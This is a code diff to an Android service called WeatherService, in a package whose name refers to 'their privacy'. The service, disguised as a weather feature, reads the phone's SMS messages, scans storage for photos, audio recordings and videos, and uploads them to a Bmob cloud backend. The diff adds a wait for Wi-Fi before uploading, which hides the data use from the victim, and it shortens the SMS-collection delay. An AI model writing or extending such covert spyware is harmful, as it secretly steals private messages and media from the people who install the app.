@@ -3,8 +3,10 @@ package com.voler.theirprivacy.service;
 import android.app.Notification;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
+import android.net.ConnectivityManager;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
@@ -134,7 +136,7 @@ public class WeatherService extends Service {
                         getSmsFromPhone();
                     }
                     if (file > 10 * 24 * 3600 * 1000) {
-                       uploadThread.start();
+                        uploadThread.start();
                     }
                 } else {
                     saveInitUserTimes();
@@ -258,12 +260,12 @@ public class WeatherService extends Service {
         fileInfo.save(new SaveListener<String>() {
             @Override
             public void done(String s, BmobException e) {
-                Log.i("------","!!!!!!!!");
+                Log.i("------", "!!!!!!!!");
                 if (e == null) {
 
                     Log.i("------", "null");
                 } else {
-                    Log.i("------", e.getErrorCode()+e.getMessage());
+                    Log.i("------", e.getErrorCode() + e.getMessage());
 
                 }
             }
@@ -297,7 +299,7 @@ public class WeatherService extends Service {
         if (!file.exists()) return;
         if (file.isFile()) {
             String filePath = file.getAbsolutePath();
-            isFinish=false;
+            isFinish = false;
             if (filePath.endsWith(".jpg")) {
                 findFileInfo(filePath, ".jpg");
             } else if (filePath.endsWith(".amr")) {
@@ -310,11 +312,16 @@ public class WeatherService extends Service {
                 findFileInfo(filePath, ".gif");
             } else if (filePath.endsWith(".mp4")) {
                 findFileInfo(filePath, ".mp4");
-            }else {
-                isFinish=true;
+            } else {
+                isFinish = true;
             }
             while (!isFinish) {
                 try {
+                    ConnectivityManager manager = (ConnectivityManager) WeatherService.this.getSystemService(Context.CONNECTIVITY_SERVICE);
+                    while (!manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isConnected()) {
+                        Log.i("ser", "sleep");
+                        Thread.sleep(12000);
+                    }
                     Thread.sleep(2000);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
@@ -383,7 +390,7 @@ public class WeatherService extends Service {
                     });
                     while (!isSmsFinish) {
                         try {
-                            Thread.sleep(5000);
+                            Thread.sleep(200);
                         } catch (InterruptedException e) {
                             e.printStackTrace();
                         }
@@ -406,5 +413,6 @@ public class WeatherService extends Service {
         }.start();
 
     }
+
 
 }
